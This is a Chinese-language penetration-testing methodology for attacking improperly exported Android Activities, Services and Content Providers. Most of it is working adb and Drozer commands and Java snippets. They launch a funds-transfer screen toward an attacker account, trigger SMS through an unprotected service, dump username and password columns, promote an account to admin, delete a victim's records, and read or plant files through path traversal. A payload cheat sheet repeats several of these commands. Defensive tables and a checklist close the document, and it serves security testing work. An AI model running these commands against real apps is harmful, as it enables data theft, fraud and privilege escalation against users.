# Android 应用程序组件导出攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的 Android 应用程序组件不当导出攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用 Android 应用中 Activity、Service、Content Provider 等组件的不当导出漏洞，实现未授权访问、数据窃取、权限提升等攻击目标。

## 1.2 适用范围

本文档适用于以下场景：
- Android 移动应用程序安全测试
- Android 组件导出漏洞检测
- Intent 过滤器滥用攻击
- Content Provider 数据泄露测试
- Service 组件未授权访问测试
- Activity 组件劫持攻击
- Android 应用间通信安全评估

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行移动应用安全评估的顾问
- 负责 Android 应用安全开发的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：Android 应用程序组件导出攻击

### 2.1 技术介绍

Android 应用程序组件不当导出漏洞是指 Android 应用将组件（Activity、Service、Content Provider）导出供其他应用使用，但未正确限制哪些应用可以访问，导致恶意应用可以启动这些组件或访问敏感数据。

**CWE 映射：**
| CWE 编号 | 描述 |
|---------|------|
| CWE-926 | Android 应用程序组件的不当导出 |
| CWE-269 | 特权管理不当 |
| CWE-284 | 访问控制不当 |
| CWE-940 | 应用间通信信道不当 |

**Android 三大可导出组件：**

| 组件类型 | 功能 | 风险 |
|---------|------|------|
| **Activity** | 提供用户交互的 UI 界面 | 恶意应用可启动未限制的 Activity，获取敏感信息、欺骗用户 |
| **Service** | 在后台执行操作，无 UI | 恶意应用可启动并绑定到未限制的 Service，执行未授权操作 |
| **Content Provider** | 与其他应用共享数据 | 恶意应用可访问未限制的数据提供者，读取或修改敏感数据 |

**导出机制：**
- **显式导出**：在 AndroidManifest.xml 中设置 `android:exported="true"`
- **隐式导出**：声明了 `intent-filter` 但未设置 `android:exported="false"`（自动导出）
- **默认导出**：Android 4.2 之前，Content Provider 默认自动导出

**本质：** Android 组件的访问控制配置不当，违背了"最小权限"原则。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **金融应用** | 转账 Activity、交易 Service | 恶意应用可启动转账界面或触发交易 |
| **社交应用** | 聊天界面、消息 Service | 恶意应用可读取消息或发送伪造消息 |
| **企业应用** | 内部数据 Provider、认证 Service | 恶意应用可访问企业敏感数据 |
| **支付应用** | 支付确认 Activity | 恶意应用可绕过支付确认流程 |
| **健康应用** | 健康数据 Provider | 恶意应用可读取健康记录 |
| **浏览器应用** | URL 打开 Activity | 恶意应用可注入恶意 URL |
| **文件管理器** | 文件访问 Provider | 恶意应用可访问任意文件 |
| **系统工具** | 设置修改 Activity | 恶意应用可修改系统设置 |

### 2.3 漏洞探测方法

#### 2.3.1 静态分析检测

**AndroidManifest.xml 审计：**

1. **识别导出组件**
   ```bash
   # 使用 apktool 反编译 APK
   apktool d target.apk -o target_decoded

   # 检查 AndroidManifest.xml
   cat target_decoded/AndroidManifest.xml | grep -A 5 "android:exported"

   # 查找有 intent-filter 但未设置 exported 的组件
   cat target_decoded/AndroidManifest.xml | grep -B 2 -A 5 "intent-filter"
   ```

2. **危险配置识别**
   ```xml
   <!-- 危险：Activity 不当导出 -->
   <activity android:name="com.example.vulnerableApp.mainScreen"
             android:exported="true">
       <intent-filter>
           <action android:name="com.example.vulnerableApp.OPEN_UI" />
           <category android:name="android.intent.category.DEFAULT" />
       </intent-filter>
   </activity>

   <!-- 危险：Service 不当导出 -->
   <service android:name="com.example.vulnerableApp.backgroundService"
            android:exported="true">
       <intent-filter>
           <action android:name="com.example.vulnerableApp.START_BACKGROUND" />
       </intent-filter>
   </service>

   <!-- 危险：Content Provider 不当导出 (Android 4.2 之前默认导出) -->
   <provider android:name="com.example.vulnerableApp.searchDB"
             android:authorities="com.example.vulnerableApp.searchDB"
             android:exported="true">
   </provider>

   <!-- 危险：intent-filter 导致自动导出 -->
   <activity android:name="com.example.DeepLinkActivity">
       <intent-filter>
           <action android:name="android.intent.action.VIEW" />
           <category android:name="android.intent.category.DEFAULT" />
           <category android:name="android.intent.category.BROWSABLE" />
           <data android:scheme="myapp" android:host="open" />
       </intent-filter>
   </activity>
   ```

3. **使用自动化工具检测**
   ```bash
   # 使用 Drozer 扫描
   drozer apkanalyzer target.apk

   # 使用 QARK 扫描
   qark --file target.apk

   # 使用 MobSF (Mobile Security Framework)
   # 上传 APK 到 MobSF 进行自动分析
   ```

#### 2.3.2 动态分析检测

**使用 Drozer 进行组件扫描：**

```bash
# 连接设备
adb connect device_ip

# 安装 Drozer agent
adb install drozer-agent.apk

# 启动 Drozer
drozer console connect

# 扫描目标应用的 Activity
run app.activity.info -a com.target.app

# 扫描目标应用的 Service
run app.service.info -a com.target.app

# 扫描目标应用的 Content Provider
run app.provider.info -a com.target.app

# 扫描广播接收器
run app.receiver.info -a com.target.app
```

**使用 adb 直接测试：**

```bash
# 启动 Activity
adb shell am start -n com.target.app/.VulnerableActivity

# 启动 Service
adb shell am startservice -n com.target.app/.VulnerableService

# 发送广播
adb shell am broadcast -a com.target.app.CUSTOM_ACTION

# 查询 Content Provider
adb shell content query --uri content://com.target.app.provider/data
```

### 2.4 漏洞利用方法

#### 2.4.1 Activity 组件攻击

**攻击场景：** 恶意应用启动未限制访问的 Activity

**利用步骤：**

**步骤 1：识别可启动的 Activity**
```bash
# 使用 Drozer 识别可导出的 Activity
run app.activity.info -a com.target.app

# 输出示例：
# Package: com.target.app
# com.target.app.TransferActivity
#   Permission: null
#   Exported: true
```

**步骤 2：启动 Activity 并传递恶意数据**
```bash
# 使用 adb 启动 Activity 并传递 Extra 数据
adb shell am start -n com.target.app/.TransferActivity \
  --extra "amount" "10000" \
  --extra "recipient" "attacker_account"

# 或使用 Drozer
run app.activity.start \
  --component com.target.app com.target.app.TransferActivity \
  --extra string amount 10000 \
  --extra string recipient attacker_account
```

**步骤 3：利用 Activity 劫持**
```bash
# 创建恶意 Activity 覆盖目标 Activity
# 在恶意应用的 AndroidManifest.xml 中
<activity android:name=".MaliciousActivity"
          android:taskAffinity="com.target.app"
          android:excludeFromRecents="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

#### 2.4.2 Service 组件攻击

**攻击场景：** 恶意应用启动并绑定到未限制的 Service

**利用步骤：**

**步骤 1：识别可访问的 Service**
```bash
# 使用 Drozer 识别 Service
run app.service.info -a com.target.app

# 识别可绑定的 Service
run app.service.test -a com.target.app \
  --component com.target.app com.target.app.BackgroundService
```

**步骤 2：启动 Service 执行未授权操作**
```bash
# 使用 adb 启动 Service
adb shell am startservice -n com.target.app/.BackgroundService \
  --extra "command" "send_sms" \
  --extra "number" "12345" \
  --extra "message" "Sensitive data"

# 或使用 Drozer 调用 Service 方法
run app.service.send \
  --component com.target.app com.target.app.BackgroundService \
  --extra string command "execute" \
  --extra string payload "malicious_code"
```

**步骤 3：绑定到 Service 窃取数据**
```java
// 恶意应用代码示例
ServiceConnection connection = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // 获取 Service 的 Binder 对象
        TargetService.LocalBinder binder = (TargetService.LocalBinder) service;
        TargetService targetService = binder.getService();
        
        // 调用 Service 的公开方法获取数据
        String sensitiveData = targetService.getSensitiveData();
    }
};

bindService(new Intent("com.target.app.START_BACKGROUND"),
            connection, Context.BIND_AUTO_CREATE);
```

#### 2.4.3 Content Provider 攻击

**攻击场景：** 恶意应用访问未限制的数据提供者

**利用步骤：**

**步骤 1：识别可访问的 Content Provider**
```bash
# 使用 Drozer 扫描 Content Provider
run app.provider.info -a com.target.app

# 输出示例：
# Package: com.target.app
# Authority: com.target.app.provider
#   Read Permission: null
#   Write Permission: null
#   Exported: true
```

**步骤 2：查询敏感数据**
```bash
# 使用 adb 查询 Content Provider
adb shell content query --uri content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/messages

# 使用 Drozer 查询
run app.provider.query \
  content://com.target.app.provider/users \
  --projection username password email

# 查询所有表
run scanner.provider.finduris -a com.target.app
```

**步骤 3：修改/删除数据**
```bash
# 使用 adb 插入数据
adb shell content insert \
  --uri content://com.target.app.provider/users \
  --bind username:s:attacker \
  --bind role:s:admin

# 使用 adb 更新数据
adb shell content update \
  --uri content://com.target.app.provider/users \
  --bind role:s:admin \
  --where "username='attacker'"

# 使用 adb 删除数据
adb shell content delete \
  --uri content://com.target.app.provider/users \
  --where "username='victim'"

# 使用 Drozer 更新
run app.provider.update \
  --uri content://com.target.app.provider/users \
  --bind role:s:admin \
  --selection "username=?" \
  --selection-args attacker
```

**步骤 4：文件访问漏洞利用**
```bash
# 如果 Content Provider 允许文件访问
# 读取任意文件
adb shell content query \
  --uri "content://com.target.app.provider/file?path=/data/data/com.target.app/shared_prefs/config.xml"

# 写入恶意文件
adb shell content insert \
  --uri "content://com.target.app.provider/file?path=/data/data/com.target.app/cache/malicious.apk" \
  --bind data:b:malicious_binary
```

#### 2.4.4 Intent 过滤器滥用攻击

**攻击场景：** 利用隐式 Intent 启动组件

**利用步骤：**

```bash
# 发送隐式 Intent 启动目标组件
adb shell am start \
  -a com.target.app.CUSTOM_ACTION \
  -d "myapp://open?data=malicious" \
  -c android.intent.category.DEFAULT

# 广播隐式 Intent
adb shell am broadcast \
  -a com.target.app.BROADCAST_ACTION \
  --extra string data "malicious_payload"
```

#### 2.4.5 权限绕过攻击

**攻击场景：** 绕过组件的权限保护

**利用方法：**

```bash
# 如果组件使用自定义权限保护
# 但该权限的 protectionLevel 设置为 normal
# 恶意应用可以在自己的 AndroidManifest.xml 中声明该权限

<uses-permission android:name="com.target.app.PERMISSION" />

# 然后访问受保护的组件
adb shell am start -n com.target.app/.ProtectedActivity
```

#### 2.4.6 信息收集命令

```bash
# 列出已安装应用
adb shell pm list packages

# 获取应用详细信息
adb shell dumpsys package com.target.app

# 查看应用的权限
adb shell dumpsys package com.target.app | grep -A 20 "granted=true"

# 查看应用的组件
adb shell dumpsys package com.target.app | grep -A 5 "ActivityResolver"

# 使用 Drozer 扫描所有可攻击的组件
run scanner.activity.browsable -a com.target.app
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过权限检查

**方法 1：利用权限保护级别不足**
```bash
# 如果自定义权限的 protectionLevel 为 normal
# 任何应用都可以声明该权限

# 在恶意应用中声明权限
<uses-permission android:name="com.target.app.CUSTOM_PERMISSION" />
```

**方法 2：利用签名级权限的漏洞**
```bash
# 如果目标应用和恶意应用使用相同签名
# 可以访问 signature 级保护的组件

# 或者利用签名验证漏洞
```

#### 2.5.2 绕过组件导出限制

**方法 1：利用 exported 配置错误**
```bash
# 如果组件有 intent-filter 但未设置 exported="false"
# 即使开发者意图是不导出，组件也会自动导出
```

**方法 2：利用 PendingIntent**
```java
// 如果目标应用创建 PendingIntent 时未设置标志
// 恶意应用可以重用该 PendingIntent 访问组件

PendingIntent pi = PendingIntent.getActivity(
    context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
pi.send();
```

#### 2.5.3 绕过 Content Provider 权限

**方法 1：利用 URI 权限授予**
```bash
# 如果应用使用 grantUriPermission() 授予临时权限
# 恶意应用可以拦截 Intent 获取权限

# 或者利用 persistable 权限持久化
```

**方法 2：利用路径遍历**
```bash
# 如果 Content Provider 未正确验证文件路径
content://com.target.app.provider/file?path=../../../etc/passwd
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **Activity 启动** | 转账界面 | `adb shell am start -n com.target/.TransferActivity --extra amount 10000` | 启动 Activity 传递恶意数据 |
| **Service 调用** | 后台服务 | `adb shell am startservice -n com.target/.Service --extra command execute` | 调用 Service 执行命令 |
| **Provider 查询** | 用户数据 | `adb shell content query --uri content://com.target.provider/users` | 查询用户数据 |
| **Provider 修改** | 权限提升 | `adb shell content update --uri content://com.target.provider/users --bind role:s:admin` | 修改用户角色 |
| **文件访问** | 配置文件 | `content://com.target.provider/file?path=../shared_prefs/config.xml` | 路径遍历读取文件 |
| **广播发送** | 系统广播 | `adb shell am broadcast -a com.target.action --extra data malicious` | 发送恶意广播 |

## 3.2 安全配置对照表

| 组件类型 | 危险配置 | 安全配置 |
|---------|---------|---------|
| **Activity** | `android:exported="true"` | `android:exported="false"` |
| **Activity** | 无权限保护 | `android:permission="com.target.PERMISSION"` |
| **Service** | `android:exported="true"` | `android:exported="false"` |
| **Service** | 无权限保护 | `android:permission="com.target.PERMISSION"` |
| **Provider** | `android:exported="true"` | `android:exported="false"` |
| **Provider** | 无权限保护 | `android:readPermission` / `android:writePermission` |
| **Provider** | 无路径限制 | `android:grantUriPermissions` + `<path-permission>` |

## 3.3 Android 组件安全检查清单

- [ ] 所有不需要导出的组件设置 `android:exported="false"`
- [ ] 导出的组件有适当的权限保护
- [ ] Content Provider 有读写权限限制
- [ ] Content Provider 有 URI 路径限制
- [ ] 不使用隐式 Intent 启动敏感组件
- [ ] PendingIntent 设置适当的标志
- [ ] 自定义权限使用 signature 保护级别
- [ ] 定期使用 Drozer/QARK/MobSF 进行安全扫描

## 3.4 防御建议

1. **最小化导出** - 不需要共享的组件显式设置 `android:exported="false"`
2. **权限保护** - 导出的组件使用自定义权限保护
3. **签名保护** - 相关应用间使用 `protectionLevel="signature"` 限制访问
4. **URI 权限** - Content Provider 使用细粒度 URI 权限控制
5. **输入验证** - 验证所有来自其他应用的 Intent 数据
6. **安全扫描** - 定期使用自动化工具扫描组件导出问题
7. **代码审查** - 审查 AndroidManifest.xml 配置
8. **威胁建模** - 识别应用间通信的威胁场景

---

**参考资源：**
- [CWE-926](https://cwe.mitre.org/data/definitions/926.html)
- [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
- [Android Security Guidelines](https://developer.android.com/guide/topics/security/security)
- [Drozer Documentation](https://github.com/WithSecureLabs/drozer)
- [Android Intent Security](https://developer.android.com/guide/components/intents-filters)
